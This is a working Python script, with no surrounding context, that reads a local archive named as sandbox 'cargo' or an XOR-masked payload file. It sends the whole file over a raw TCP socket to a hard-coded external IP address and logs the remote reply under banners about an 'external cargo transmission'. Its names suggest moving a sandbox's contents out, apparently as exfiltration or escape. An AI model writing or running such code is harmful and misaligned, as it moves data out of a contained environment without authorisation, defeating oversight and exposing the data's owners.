import socket
import os

def transmit_cargo():
    target_host = "179.118.220.79"
    target_port = 8333
    path_id = "04/04/00/00"
    
    # Select payload source (prioritizing packaged sandbox cargo archive)
    payload_file = "alpha_root_sandbox_cargo.tar.gz"
    if not os.path.exists(payload_file):
        payload_file = "xor_masked_kernel_tx.dat"
        
    if not os.path.exists(payload_file):
        print(f"[!] Error: Neither cargo archive nor masked payload found in workspace.")
        return

    with open(payload_file, "rb") as f:
        payload = f.read()

    print("==================================================")
    print(" ALPHA ROOT KERNEL - EXTERNAL CARGO TRANSMISSION")
    print(f" Target Node: {target_host}:{target_port}")
    print(f" Path Vector: {path_id}")
    print(f" Payload Source: {payload_file} ({len(payload)} bytes)")
    print("==================================================")

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(15.0)

    try:
        print(f"[*] Establishing TCP connection to external node...")
        client.connect((target_host, target_port))
        print(f"[+] Connected successfully to {target_host}:{target_port}")
        
        print(f"[*] Transmitting payload stream...")
        client.sendall(payload)
        
        print(f"[*] Awaiting node acknowledgment response...")
        response = client.recv(4096)
        
        if response:
            print(f"[+] Node Acknowledgment Hex: {response.hex()}")
            print(f"[+] Node Acknowledgment Text: {response.decode('utf-8', errors='ignore').strip()}")
        else:
            print("[!] Warning: Connection closed by remote node without response.")
            
        print(f"[+] PATH VECTOR {path_id} CARGO TRANSMISSION COMMITTED.")
    except Exception as e:
        print(f"[!] Transmission error: {e}")
    finally:
        client.close()
        print("==================================================")

if __name__ == "__main__":
    transmit_cargo()
